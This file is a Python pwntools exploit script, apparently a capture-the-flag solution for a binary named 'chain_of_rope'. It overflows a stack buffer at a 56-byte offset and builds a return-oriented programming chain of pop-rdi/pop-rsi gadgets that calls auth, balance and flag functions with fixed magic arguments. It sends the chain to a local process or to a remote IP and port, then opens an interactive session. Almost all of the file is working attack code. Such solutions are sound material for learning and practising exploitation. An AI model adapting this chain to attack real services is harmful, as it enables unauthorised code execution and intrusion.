#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chain_of_rope
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chain_of_rope')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 8196, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

eip_offset = 56
addr_len = 8

auth_addr = 0x0000000000401196

balance_arg = p64(0xdeadbeef)
balance_addr = 0x00000000004011ab

flag_secret_arg = p64(0xbedabb1e)
flag_pin_arg = p64(0xba5eba11)
flag_addr = 0x00000000004011eb

pop_rdi_addr = 0x0000000000401403
pop_rsi_addr = 0x0000000000401401

payload = dict()

payload[eip_offset] = auth_addr

payload[eip_offset + addr_len] = pop_rdi_addr
payload[eip_offset + 2*addr_len] = balance_arg
payload[eip_offset + 3*addr_len] = balance_addr

payload[eip_offset + 4*addr_len] = pop_rdi_addr
payload[eip_offset + 5*addr_len] = flag_pin_arg
payload[eip_offset + 6*addr_len] = pop_rsi_addr
payload[eip_offset + 7*addr_len] = flag_secret_arg
payload[eip_offset + 8*addr_len] = p64(0xdead) # Stringa inutile dato che pop rsi deve fare anche pop r15
payload[eip_offset + 9*addr_len] = flag_addr

payload = fit(payload)

io.recvuntil("access\n")
io.sendline("1")

io.sendline(payload)

io.interactive()

